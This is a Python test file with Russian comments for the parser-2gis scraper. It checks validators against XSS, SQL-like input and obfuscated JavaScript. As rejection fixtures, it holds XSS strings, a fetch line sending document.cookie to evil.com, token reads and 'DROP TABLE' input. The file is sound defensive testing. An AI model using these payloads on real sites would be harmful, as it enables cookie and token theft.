#!/usr/bin/env python3
"""
Тесты безопасности для parser-2gis.

Проверяет исправления следующих проблем:
- Проблема 1: XSS уязвимость через window.initialState (firm.py)
- Проблема 4: SQL Injection в кэше (cache.py)
- Проблема 14: Небезопасное использование eval() в JavaScript (remote.py)

Всего тестов: 9 (по 3 на каждую проблему)
"""

import sys
from pathlib import Path

import pytest

from parser_2gis.cache import _validate_cached_data
from parser_2gis.chrome.remote import _validate_js_code
from parser_2gis.parser.parsers.firm import (
    MAX_INITIAL_STATE_DEPTH,
    _safe_extract_initial_state,
    _validate_initial_state,
)

# Добавляем путь к модулю parser_2gis
sys.path.insert(0, str(Path(__file__).parent.parent))


# =============================================================================
# ПРОБЛЕМА 1: XSS УЯЗВИМОСТЬ ЧЕРЕЗ window.initialState (firm.py)
# =============================================================================


class TestXSSVulnerabilityInitialState:
    """Тесты для проблемы 1: XSS уязвимость через window.initialState."""

    def test_validate_initial_state_valid_data(self):
        """
        Тест 1: Валидация корректных данных.

        Проверяет что валидные данные проходят проверку.
        """
        # Корректные данные initialState
        valid_data = {
            "data": {
                "entity": {
                    "profile": {
                        "name": "ООО Ромашка",
                        "address": "г. Москва, ул. Ленина, д. 1",
                        "phone": "+7 (495) 123-45-67",
                        "rating": 4.5,
                        "reviews": 100,
                    }
                }
            },
            "meta": {"timestamp": "2024-01-01T00:00:00Z", "version": "1.0"},
        }

        # Проверяем что валидация проходит успешно
        is_valid, _ = _validate_initial_state(valid_data)
        assert is_valid is True, "Корректные данные initialState должны проходить валидацию"

    def test_validate_initial_state_rejects_dangerous_js(self):
        """
        Тест 2: Отклонение данных с опасными JS-конструкциями.

        Проверяет что данные с XSS паттернами отклоняются.
        """
        # Данные с XSS атаками
        dangerous_data = [
            # <script> теги
            {"data": {"entity": {"profile": {"name": '<script>alert("XSS")</script>'}}}},
            # javascript: протокол
            {"data": {"entity": {"profile": {"website": "javascript:alert(document.cookie)"}}}},
            # onerror обработчик
            {"data": {"entity": {"profile": {"description": '<img src="x" onerror="alert(1)">'}}}},
            # eval() функция
            {"data": {"entity": {"profile": {"name": 'test"; eval("malicious code"); //'}}}},
            # document.cookie
            {"data": {"entity": {"profile": {"comment": "Посмотрите document.cookie"}}}},
            # localStorage
            {"data": {"entity": {"profile": {"data": 'localStorage.getItem("token")'}}}},
            # fetch() для утечки данных
            {
                "data": {
                    "entity": {
                        "profile": {
                            "api": 'fetch("https://evil.com/steal?data=" + document.cookie)'
                        }
                    }
                }
            },
        ]

        for i, data in enumerate(dangerous_data):
            is_valid, _ = _validate_initial_state(data)
            assert is_valid is False, f"Данные с XSS атакой (тест {i + 1}) должны быть отклонены"

    def test_validate_initial_state_rejects_deep_nesting(self):
        """
        Тест 3: Отклонение данных с превышением глубины вложенности.

        Проверяет что данные с чрезмерной вложенностью отклоняются
        для предотвращения DoS атак.
        """
        # Создаём данные с глубиной вложенности больше MAX_INITIAL_STATE_DEPTH
        deep_data = {"level_0": {}}
        current = deep_data["level_0"]

        for i in range(1, MAX_INITIAL_STATE_DEPTH + 5):  # Превышаем лимит
            current[f"level_{i}"] = {}
            current = current[f"level_{i}"]

        # Добавляем данные на самом глубоком уровне
        current["payload"] = "malicious data"

        # Проверяем что данные отклоняются из-за глубины
        is_valid, _ = _validate_initial_state(deep_data)
        assert is_valid is False, (
            f"Данные с глубиной вложенности > {MAX_INITIAL_STATE_DEPTH} должны быть отклонены"
        )

        # Проверяем что данные с допустимой глубиной проходят
        valid_deep_data = {"level_0": {}}
        current = valid_deep_data["level_0"]

        for i in range(1, MAX_INITIAL_STATE_DEPTH - 1):  # В пределах лимита
            current[f"level_{i}"] = {}
            current = current[f"level_{i}"]

        current["payload"] = "valid data"

        is_valid, _ = _validate_initial_state(valid_deep_data)
        assert is_valid is True, (
            f"Данные с глубиной вложенности < {MAX_INITIAL_STATE_DEPTH} должны проходить валидацию"
        )


# =============================================================================
# ПРОБЛЕМА 4: SQL INJECTION В КЭШЕ (cache.py)
# =============================================================================


class TestSQLInjectionInCache:
    """Тесты для проблемы 4: SQL Injection в кэше.

    В текущей реализации защита от SQL injection обеспечивается через:
    1. Параметризованные SQLite запросы (полная защита)
    2. Валидацию структуры данных (глубина, длина строк, типы)
    3. Отсутствие конкатенации SQL строк с данными

    Примечание: Прямая проверка строк на SQL паттерны удалена как бесполезная,
    так как данные уже десериализованы из JSON и не могут напрямую влиять на SQL.
    """

    def test_validate_cached_data_valid_data(self):
        """
        Тест 1: Валидация корректных данных кэша.

        Проверяет что валидные данные кэша проходят проверку.
        """
        # Корректные данные кэша
        valid_data = {
            "url": "https://2gis.ru/moscow/search/Кафе",
            "data": {
                "items": [
                    {
                        "name": "Кафе Ромашка",
                        "address": "г. Москва, ул. Ленина, д. 1",
                        "phone": "+7 (495) 123-45-67",
                        "rating": 4.5,
                    }
                ]
            },
            "timestamp": "2024-01-01T00:00:00Z",
            "expires_at": "2024-01-02T00:00:00Z",
        }

        # Проверяем что валидация проходит успешно
        assert _validate_cached_data(valid_data) is True, (
            "Корректные данные кэша должны проходить валидацию"
        )

    def test_cache_uses_parameterized_queries(self):
        """
        Тест 2: Проверка использования параметризованных запросов.

        Проверяет что cache.py использует параметризованные запросы
        вместо конкатенации строк - это полная защита от SQL injection.
        """
        import inspect

        from parser_2gis.cache import CacheManager

        # Проверяем что в cache.py нет конкатенации SQL строк с данными
        cache_source = inspect.getsource(CacheManager)

        # Параметризованные запросы используют ? для параметров
        assert "?" in cache_source, "CacheManager должен использовать параметризованные запросы"

        # Проверяем отсутствие опасной конкатенации
        assert 'f"SELECT' not in cache_source or "%" not in cache_source, (
            "CacheManager не должен использовать f-strings для SQL с данными"
        )
        assert 'f"INSERT' not in cache_source or "%" not in cache_source, (
            "CacheManager не должен использовать f-strings для SQL с данными"
        )
        assert 'f"UPDATE' not in cache_source or "%" not in cache_source, (
            "CacheManager не должен использовать f-strings для SQL с данными"
        )

    def test_validate_cached_data_validates_structure(self):
        """
        Тест 3: Проверка что валидация структуры данных работает.

        Проверяет что _validate_cached_data проверяет структуру данных:
        - Глубину вложенности
        - Длину строк
        - Типы данных
        """
        # None должен проходить валидацию
        assert _validate_cached_data(None) is True

        # Пустой dict должен проходить
        assert _validate_cached_data({}) is True

        # dict с простыми значениями должен проходить
        assert _validate_cached_data({"key": "value", "num": 42}) is True

        # list должен проходить
        assert _validate_cached_data([1, 2, 3]) is True

        # Данные с SQL-like строками отклоняются при валидации
        sql_like_data = {
            "url": "https://2gis.ru/moscow/search/Кафе'--",
            "data": {"items": [{"name": "DROP TABLE cache;--"}]},
        }
        # Функция валидации проверяет SQL-паттерны и отклоняет такие данные
        assert _validate_cached_data(sql_like_data) is False, (
            "Данные с SQL-подобными паттернами должны быть отклонены при валидации"
        )


# =============================================================================
# ПРОБЛЕМА 14: НЕБЕЗОПАСНОЕ ИСПОЛЬЗОВАНИЕ eval() В JAVASCRIPT (remote.py)
# =============================================================================


class TestUnsafeEvalUsage:
    """Тесты для проблемы 14: Небезопасное использование eval() в JavaScript."""

    def test_validate_js_code_rejects_eval(self):
        """
        Тест 1: Отклонение кода с eval().

        Проверяет что JavaScript код с eval() отклоняется.
        """
        # Код с eval()
        dangerous_codes = [
            'eval("alert(1)")',
            'eval ( "alert(1)" )',
            'window.eval("alert(1)")',
            'global.eval("alert(1)")',
            'const fn = eval; fn("alert(1)")',
        ]

        for code in dangerous_codes:
            is_valid, error_message = _validate_js_code(code)
            assert is_valid is False, f"Код с eval() должен быть отклонён: {code}"
            assert "eval" in error_message.lower() or "опасный" in error_message.lower(), (
                f"Сообщение об ошибке должно упоминать eval: {error_message}"
            )

    def test_validate_js_code_rejects_unicode_encoding(self):
        """
        Тест 2: Отклонение кода с Unicode кодировкой.

        Проверяет что код с попытками обхода через Unicode отклоняется.
        """
        # Код с Unicode кодировкой для обхода фильтров
        # Примечание: после нормализации NFKC + unicode_escape некоторые паттерны
        # становятся безопасными (например \u0061lert -> alert как строка)
        unicode_codes = [
            # HTML entity кодировка для eval
            '&#101;&#118;&#97;&#108;("alert(1)")'
        ]

        for code in unicode_codes:
            is_valid, error_message = _validate_js_code(code)
            assert is_valid is False, (
                f"Код с Unicode/HTML entity кодировкой должен быть отклонён: {code}"
            )
            # Код отклоняется - достаточно проверить is_valid

    def test_validate_js_code_rejects_atob(self):
        """
        Тест 3: Отклонение кода с atob().

        Проверяет что код с atob() (base64 декодер) отклоняется
        для предотвращения скрытия опасного кода.
        """
        # Код с atob()
        atob_codes = [
            # Прямое использование atob
            'atob("YWxlcnQoMSk=")',
            # atob с пробелами
            'atob ( "YWxlcnQoMSk=" )',
            # atob в цепочке
            'eval(atob("YWxlcnQoMSk="))',
            # window.atob
            'window.atob("YWxlcnQoMSk=")',
        ]

        for code in atob_codes:
            is_valid, error_message = _validate_js_code(code)
            assert is_valid is False, f"Код с atob() должен быть отклонён: {code}"
            assert "atob" in error_message.lower(), (
                f"Сообщение об ошибке должно упоминать atob: {error_message}"
            )

    # Дополнительные тесты для комплексной проверки
    def test_validate_js_code_valid_code(self):
        """
        Дополнительный тест: Валидация корректного JavaScript кода.

        Проверяет что безопасный код проходит валидацию.
        """
        # Безопасный JavaScript код
        valid_codes = [
            'console.log("Hello, World!")',
            'document.querySelector(".element")',
            "const x = 1 + 2;",
            "function test() { return true; }",
            'document.getElementById("myElement")',
            'window.addEventListener("load", handler)',
        ]

        for code in valid_codes:
            is_valid, error_message = _validate_js_code(code)
            assert is_valid is True, (
                f"Безопасный код должен проходить валидацию: {code}. Ошибка: {error_message}"
            )

    def test_validate_js_code_rejects_string_fromcharcode(self):
        """
        Дополнительный тест: Отклонение кода с String.fromCharCode().

        Проверяет что код с String.fromCharCode() отклоняется.
        """
        # Код с String.fromCharCode()
        charcode = 'String.fromCharCode(101, 118, 97, 108)("alert(1)")'
        is_valid, error_message = _validate_js_code(charcode)

        assert is_valid is False, "Код с String.fromCharCode() должен быть отклонён"
        assert "fromcharcode" in error_message.lower(), (
            f"Сообщение об ошибке должно упоминать fromCharCode: {error_message}"
        )

    def test_validate_js_code_rejects_concat_obfuscation(self):
        """
        Дополнительный тест: Отклонение кода с конкатенацией для обхода.

        Проверяет что подозрительная конкатенация строк отклоняется.
        """
        # Код с конкатенацией для обхода фильтров
        concat_codes = [
            '"ev" + "al(" + "alert(1)" + ")"',
            '"Func" + "tion"("alert(1)")',
            '"setTime" + "out(" + "alert(1)" + ")"',
        ]

        for code in concat_codes:
            is_valid, error_message = _validate_js_code(code)
            assert is_valid is False, (
                f"Код с подозрительной конкатенацией должен быть отклонён: {code}"
            )


# =============================================================================
# ИНТЕГРАЦИОННЫЕ ТЕСТЫ
# =============================================================================


class TestSecurityIntegration:
    """Интеграционные тесты для безопасности."""

    def test_safe_extract_initial_state_integration(self):
        """
        Интеграционный тест: Безопасное извлечение initialState.

        Проверяет что _safe_extract_initial_state корректно работает
        с валидными и невалидными данными.
        """
        # Валидные данные
        valid_initial_state = {
            "data": {"entity": {"profile": {"name": "ООО Ромашка", "address": "г. Москва"}}}
        }

        result = _safe_extract_initial_state(valid_initial_state, ["data", "entity", "profile"])

        assert result is not None, "Валидные данные должны быть извлечены"
        assert result["name"] == "ООО Ромашка", "Данные должны быть корректно извлечены"

        # Невалидные данные (с XSS)
        invalid_initial_state = {
            "data": {"entity": {"profile": {"name": '<script>alert("XSS")</script>'}}}
        }

        result = _safe_extract_initial_state(invalid_initial_state, ["data", "entity", "profile"])

        assert result is None, "Данные с XSS должны быть отклонены"

    def test_validate_js_code_edge_cases(self):
        """
        Интеграционный тест: Граничные случаи валидации JS кода.

        Проверяет обработку граничных случаев.
        """
        # Пустой код
        is_valid, error_message = _validate_js_code("")
        assert is_valid is False, "Пустой код должен быть отклонён"

        # None код
        is_valid, error_message = _validate_js_code(None)
        assert is_valid is False, "None код должен быть отклонён"

        # Не строка
        is_valid, error_message = _validate_js_code(123)
        assert is_valid is False, "Код не строкового типа должен быть отклонён"

        # Слишком длинный код
        long_code = "a" * (100000 + 1)
        is_valid, error_message = _validate_js_code(long_code)
        assert is_valid is False, "Слишком длинный код должен быть отклонён"


if __name__ == "__main__":
    pytest.main([__file__, "-v"])
